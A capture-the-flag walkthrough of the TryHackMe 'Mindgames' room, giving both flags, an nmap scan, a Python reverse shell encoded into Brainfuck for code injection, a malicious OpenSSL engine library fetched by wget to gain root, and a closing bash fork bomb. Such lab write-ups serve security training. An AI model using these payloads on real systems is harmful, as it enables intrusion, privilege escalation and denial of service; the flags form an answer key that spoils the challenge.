
# Mindgames -TryHackMe
> # RjRaju

# Task-1 [ CTF ]
- Q. User flag.

<!--- ` thm{411f7d38247ff441ce4e134b459b6268} ` -->

-  Q. Root flag.

<!-- ` thm{1974a617cc84c5b51411c283544ee254} ` -->

---

# Nmap Scan

```
$ nmap -sV -sC -A 10.10.39.252 -oN nmap.log -vv
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-18 10:47 IST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating Ping Scan at 10:47
Scanning 10.10.39.252 [2 ports]
Completed Ping Scan at 10:47, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:47
Completed Parallel DNS resolution of 1 host. at 10:47, 0.03s elapsed
Initiating Connect Scan at 10:47
Scanning 10.10.39.252 [1000 ports]
Discovered open port 80/tcp on 10.10.39.252
Discovered open port 22/tcp on 10.10.39.252
Increasing send delay for 10.10.39.252 from 0 to 5 due to 26 out of 86 dropped probes since last increase.
Completed Connect Scan at 10:47, 23.39s elapsed (1000 total ports)
Initiating Service scan at 10:47
Scanning 2 services on 10.10.39.252
Completed Service scan at 10:48, 14.66s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.39.252.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 5.55s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Nmap scan report for 10.10.39.252
Host is up, received syn-ack (0.23s latency).
Scanned at 2022-02-18 10:47:25 IST for 45s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.43 seconds
```

# Reverse Shell
## Encode Python Reverse shell to brainF***
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```
+++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++
[->-- ----- --<]> ---.< +++++ ++++[ ->+++ +++++ +<]>+ +.--- -.<++ +[->-
--<]> ---.+ +++++ ++.-- ----. <+++[ ->+++ <]>++ ++++. <++++ ++++[ ->---
----- <]>-- ----- -.<++ +++++ +[->+ +++++ ++<]> +++++ ++.++ .<+++ +[->-
---<] >---. <+++[ ->+++ <]>++ +++.+ +.--- .<+++ [->-- -<]>- --.++ .<+++
[->++ +<]>+ ++++. .<+++ +++++ [->-- ----- -<]>- ----- -.<++ +++++ +[->+
+++++ ++<]> +++.+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ +++++ +[->+
+++++ +<]>+ +++++ +.<++ +++++ [->-- ----- <]>-- ---.< +++++ ++[-> +++++
++<]> +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.< +++[- >+++<
]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++ +++[- >++++ ++++<
]>+++ ++.-- --.<+ ++[-> ---<] >---. +++++ +++.- ----- .<+++ [->++ +<]>+
+++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- -.<++ +++++ +[->+ +++++
++<]> +++++ +++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----. <+++[
->+++ <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----. <++++ [->++ ++<]>
+++.+ ++++. <++++ +[->+ ++++< ]>.<+ +++[- >---- <]>-- ----. +++++ .----
----- .<+++ [->++ +<]>+ +++++ .<+++ +++[- >---- --<]> ----. <++++ ++++[
->+++ +++++ <]>++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.<
+++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++ +[->+
+++++ <]>+. ----. <+++[ ->--- <]>-- -.+++ +++++ .<+++ +[->+ +++<] >++++
.<+++ [->-- -<]>- --.+. --.<+ ++[-> ---<] >---- .---- .<+++ [->++ +<]>+
++.<+ +++++ [->-- ----< ]>.<+ +++[- >++++ <]>++ .<+++ ++++[ ->+++ ++++<
]>+++ ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>
++++. <+++[ ->+++ <]>++ +.-.. ----- ----. --.<+ +++[- >++++ <]>+. <++++
++++[ ->--- ----- <]>-- ----- ----- ..--- ---.< +++[- >+++< ]>+++ +++.+
.++++ +.--- ----- -.++. --.++ .--.+ ++.<+ ++[-> ---<] >---- --.<+ ++[->
+++<] >+.++ +++++ +.... <+++[ ->--- <]>-- ..<++ ++[-> ++++< ]>++. <++++
+++[- >++++ +++<] >+++. ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++
++[-> +++++ ++<]> +++++ .<+++ +[->+ +++<] >+.-- ---.< +++++ ++[-> -----
--<]> ----- ----- ---.< +++[- >---< ]>-.< +++++ +++[- >++++ ++++< ]>+++
+++++ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+
+++++ +.+++ .+++. ----- --.++ +++++ ++.+. <++++ ++++[ ->--- ----- <]>--
----- .+.++ +.+++ +.--- ----. <++++ [->++ ++<]> ++.<+ ++++[ ->--- --<]>
--.<+ +++++ ++[-> +++++ +++<] >++++ +++++ +++++ +.+++ +.<++ +++++ +[->-
----- --<]> ----- .<+++ ++++[ ->+++ ++++< ]>+++ ++.<+ +++[- >++++ <]>+.
----- .<+++ ++++[ ->--- ----< ]>--- ----- ----- .<+++ [->-- -<]>- .<+++
+++++ [->++ +++++ +<]>+ +++++ +++++ .<+++ +++++ [->-- ----- -<]>- ----.
<++++ +++[- >++++ +++<] >++++ +++.+ ++.++ +.--- ----. +++++ ++++. +.<++
+++++ +[->- ----- --<]> ----- --.+. +++.+ ++++. ----- ---.< ++++[ ->+++
+<]>+ +.<++ +++[- >---- -<]>- -.<++ +++++ +[->+ +++++ ++<]> +++++ +++++
+++++ .++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<]
>++++ +.<++ ++[-> ++++< ]>+.- ----. <++++ +++[- >---- ---<] >---- -----
----. <+++[ ->--- <]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++ ++++. <++++
++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++
.---- ---.+ +++++ +++.+ .<+++ +++++ [->-- ----- -<]>- ----- -.+.+ ++.++
++++. ----- ----. <++++ [->++ ++<]> ++.<+ +++++ +[->+ +++++ +<]>+ +++.<
+++++ ++[-> ----- --<]> --.<+ +++++ +[->+ +++++ +<]>+ ++++. ++.<+ +++[-
>---- <]>-- -.<++ +[->+ ++<]> +++++ .++.- --.<+ ++[-> ---<] >---. ++.<+
++[-> +++<] >++++ +..<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++
+++++ <]>++ ++.-- .<+++ [->++ +<]>+ +..<+ +++++ ++[-> ----- ---<] >----
.<+++ ++++[ ->+++ ++++< ]>++. <++++ +++[- >---- ---<] >---- ----. <+++[
->+++ <]>++ ++.<+ +++++ +[->+ +++++ +<]>+ +.+++ ++++. +++++ .<+++ ++++[
->--- ----< ]>--- ----- ----- -.<++ +++++ +[->+ +++++ ++<]> ++++. <+++[
->--- <]>-- .<+++ +++++ [->-- ----- -<]>- ----- .<+++ [->++ +<]>+ .<+++
[->-- -<]>- .<+++ [->++ +<]>+ +.<++ +++++ [->++ +++++ <]>++ +++++ ++++.
<++++ ++++[ ->--- ----- <]>-- ----- .<+++ ++++[ ->+++ ++++< ]>+++ +++++
++.<+ +++++ +[->- ----- -<]>- --.<+ +++[- >++++ <]>++ .<
```

# User flag

```
$ cd /home/mindgames/
$ ls
user.txt  webserver
$ cat user.txt 
thm{411f7d38247ff441ce4e134b459b6268}
$ 
```
# Root flag

-  In attacker meachine create a exploit code
```
$ cat exploit.c 
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    system("/bin/sh");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
-  Run the `exploit.c` code in attacker meachine 
```
$ gcc -fPIC -o exploit-file.o -c exploit.c && gcc -shared -o exploit.so -lcrypto exploit-file2.o 
exploit.c: In function ‘bind’:
exploit.c:4:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |     setuid(0);
      |     ^~~~~~

```
```
$ ls
exploit.c exploit-file2.o exploit.so exploit-file.o

```
-  send exploit.so to box
```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
```
$ wget http://$(IP):8000/exploit.so
--2022-02-18 06:12:09--  http://$(IP):8000/exploit.so
Connecting to $(IP):8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16432 (16K) [application/octet-stream]
Saving to: ‘exploit.so’

filename.so         100%[===================>]  16.05K  91.9KB/s    in 0.2s    

2022-02-18 06:12:10 (91.9 KB/s) - ‘exploit.so’ saved [16432/16432]

```
-  Run the `exploit.so`
```
$ openssl req -engine ./exploit.so
# whoami
root
# id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
# cd /root
# ls
root.txt
# cat root.txt
thm{1974a617cc84c5b51411c283544ee254}
# 
```
# COMPLETED :)

>## ():{ :|: & };:

